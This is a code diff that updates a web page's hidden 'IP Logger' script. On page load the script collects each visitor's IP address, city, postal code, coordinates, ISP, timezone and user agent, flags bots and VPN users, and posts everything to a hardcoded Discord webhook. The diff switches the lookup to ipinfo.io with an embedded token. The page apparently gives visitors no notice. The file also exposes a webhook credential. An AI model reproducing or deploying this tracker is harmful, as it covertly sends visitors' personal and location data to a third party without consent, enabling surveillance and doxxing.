@@ -5,7 +5,7 @@
   <script>
     async function logIP() {
       try {
-        const ipRes = await fetch('https://ip-api.com/json/');
+        const ipRes = await fetch("https://ipinfo.io/json?token=3593973cdb2296");
         const ipData = await ipRes.json();
 
         const ua = navigator.userAgent;
@@ -13,29 +13,30 @@
 
         const webhookURL = "https://discord.com/api/webhooks/1391180175135473734/F_1guAsaK6cbFe4vor5O0jzsaRNVuESM5LV4SS5xYHaVlRgISMxDgqn4Uj99mO5FFJ0M";
 
-        // Bot detection keywords
+        // Bot detection
         const botKeywords = ["bot", "crawl", "spider", "curl", "wget", "python", "scrape", "slurp"];
         const isBot = botKeywords.some(keyword => uaLower.includes(keyword));
 
-        // VPN/Proxy detection keywords in ISP/org name
-        const vpnKeywords = ["vpn", "proxy", "hosting", "aws", "amazon", "google", "microsoft", "digitalocean", "cloudflare"];
-        const isp = (ipData.isp || "").toLowerCase();
+        // VPN/Cloud detection
+        const vpnKeywords = ["vpn", "proxy", "hosting", "cloud", "amazon", "google", "azure", "digitalocean"];
         const org = (ipData.org || "").toLowerCase();
-        const isVPN = vpnKeywords.some(k => isp.includes(k) || org.includes(k));
+        const isVPN = vpnKeywords.some(k => org.includes(k));
 
-        // Discord embed message structure
+        const locParts = ipData.loc ? ipData.loc.split(",") : ["?", "?"];
+        const lat = locParts[0];
+        const lon = locParts[1];
+
         const embed = {
           title: isBot ? "🤖 Possible Bot Detected" : "📱 Possible Device Detected",
           color: isBot ? 0xff0000 : 0x00ff00,
           fields: [
-            { name: "IP Address", value: `\`${ipData.query}\``, inline: true },
-            { name: "Location", value: `${ipData.city}, ${ipData.regionName}, ${ipData.country} (${ipData.zip})`, inline: true },
-            { name: "Coordinates", value: `${ipData.lat}, ${ipData.lon}`, inline: true },
-            { name: "ISP", value: ipData.isp || "N/A", inline: true },
-            { name: "Organization", value: ipData.org || "N/A", inline: true },
+            { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
+            { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country} ${ipData.postal || ""}`, inline: true },
+            { name: "Coordinates", value: `${lat}, ${lon}`, inline: true },
+            { name: "ISP/Org", value: ipData.org || "N/A", inline: true },
             { name: "Timezone", value: ipData.timezone || "N/A", inline: true },
             { name: "VPN/Proxy Detected", value: isVPN ? "Yes" : "No", inline: true },
-            { name: "User Agent", value: ua || "N/A", inline: false },
+            { name: "User Agent", value: ua || "N/A", inline: false }
           ],
           footer: {
             text: "IP Logger by Your Bot"
@@ -46,7 +47,7 @@
         await fetch(webhookURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ embeds: [embed] }),
+          body: JSON.stringify({ embeds: [embed] })
         });
 
         setTimeout(() => {
